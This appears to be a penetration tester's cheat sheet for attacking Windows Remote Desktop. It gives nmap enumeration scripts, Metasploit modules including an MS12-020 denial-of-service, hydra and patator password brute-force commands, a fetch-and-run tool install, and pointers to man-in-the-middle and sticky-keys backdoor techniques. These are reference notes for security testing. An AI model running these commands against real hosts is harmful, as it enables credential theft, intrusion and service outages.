# RDP

### remote connect

#### remember when you access an active RDP session the current user will be kicked off

remote desktop connection from linux

```text
rdesktop -u [user] [domain or ip]
xfreerdp /u:"[user]" /v:[ip]:[port]
```

### nmap

```text
nmap -Pn -n 127.0.0.1 --script rdp-enum-encryption
nmap -Pn -n 127.0.0.1 --script rdp-ntlm-info
nmap -Pn -n 127.0.0.1 --script rdp-vuln-ms12-020
```

### metasploit modules

```text
use auxiliary/scanner/rdp/ms12_020_check
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
```

### rdp-sec-check

checks which encryption algorithms and authentication methods are used, as well as some other security settings. At the end of the check, rdp-sec-check summarizes the potential security issues of the Remote Desktop Service.

```text
sudo cpan
install Encoding::BER
Ctrl+d
wget https://raw.githubusercontent.com/portcullislabs/rdp-sec-check/master/rdp-sec-check.pl
chmod +x rdp-sec-check.pl
./rdp-sec-check.pl --help
```

### brute force

```text
patator rdp_login host=192.168.0.101 user=FILE0 password=FILE1 0=user.txt 1=passwords.txt
hydra -V -f -L /root/Desktop/user.txt -P /root/Desktop/dict.txt rdp://192.168.0.102
```

### Man-in-the-middle attack on RDP

Responder is a comprehensive tool for performing a man-in-the-middle attack against Windows authentication methods. Among other rogue servers , the program has an RDP server.

#### for more info refer to [windows authentication hacking](https://miloserdov.org/?p=4055)

### Sticky-keys & Utilman

sticky-keys-hunter is a script for testing RDP hosts on sticky keys and utilman backdoor.

```text
sticky-keys-hunter TARGET_IP
```



